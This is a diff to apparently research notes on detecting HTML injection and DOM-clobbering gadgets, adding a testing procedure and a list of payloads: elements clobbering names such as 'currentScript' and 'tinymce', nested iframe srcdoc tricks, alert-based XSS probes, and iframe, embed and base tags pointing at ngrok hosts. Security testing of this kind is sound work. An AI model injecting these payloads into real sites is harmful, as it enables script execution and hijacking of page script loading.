@@ -33,12 +33,51 @@ Gadgets finding requires comprehensive page interaction to trigger the javascrip
 
 + Step1. Find all the user interactable elements in the page.
 + Step2. Input the different payloads and check whether it will be rendered as html.
-  + Step2-1: test raw html (e.g. <h1>html</h1>) & log;
+  + Step2-1: test raw html (e.g. `<h1>html</h1>`) & log;
+  
   + Step2-2: test markups (e.g. markup language for different template engines) & log;
 + Step3. Check whether the content will be escaped, removed or rendered.
 + Step4. Perform submittion, render or navigation action to check whether the html injection can be stored.
 
+<image onerror=debugger; src=attack>
+<image id="" name="attack"; src=attack>
+<image name="attack"; src=attack>
+<img src=attack>
 
+<a id="attack" href="b"></a>
+<customtag id="attack"></customtag>
+<article id="attack"></article>
+<iframe name="currentScript" src="https://644dcb5e93a6.ngrok.app"></iframe>
+<base id="attack"></base>
+<aside id="attack"></aside>
+<audio id="attack"></audio>
+<b id="attack"></b>
+
+<a id="tinymce"></a><a id="tinymce" name="base" href="https://1b4e490f3251.ngrok.app/"></a>
+<embed name="currentScript" src="https://644dcb5e93a6.ngrok.app"></embed>
+<img name="attack" src="https://xxx.xxx.xxx/"></img>
+<object id="attack" data="https://xxx.xxx.xxx/"></object>
+<form name="attack"></form> <form name="attack" id="src"></form>
+<form name="attack"><img name="src" src="https://xxx.xxx.xxx/"></form>
+<form name="attack"><output name="src"> https://xxx.xxx.xxx/ </output></form>
+<object id=attack><img id="attack" name="src" src="https://xxx.xxx.xxx/" /></object>
+
+<script>alert(2); console.trace();</script>
+<script>console.trace(); alert(3)</script>
+<img src=x onerror=alert(4);>
+
+<a id="attack"></a><a id="attack" name="b" href="c"></a>
+<form id="attack"><input id="b"/> </form>
+
+<form id="attack"><button id="b"/> </button> </form>
+
+<form id="attack"><img id="b" name="attack" src="c" /> </form>
+
+<form id="attack"> <form id="attack" name="b"> <input name="c" value="d"> </form>
+
+<iframe name=window srcdoc=" <iframe name=attack srcdoc=&quot; <iframe name=b srcdoc=&amp;quot; <a id='c' href='d'></a> &amp;quot;></iframe> &quot;></iframe> " src="https://xxx.xxx.xxx/"></iframe>
+
+<form name="attack"><textarea name="b" /> </textarea> </form> 
 ## TODO: Pipeline for finding html injection using llm-crawler 
 @Ishmeals
 
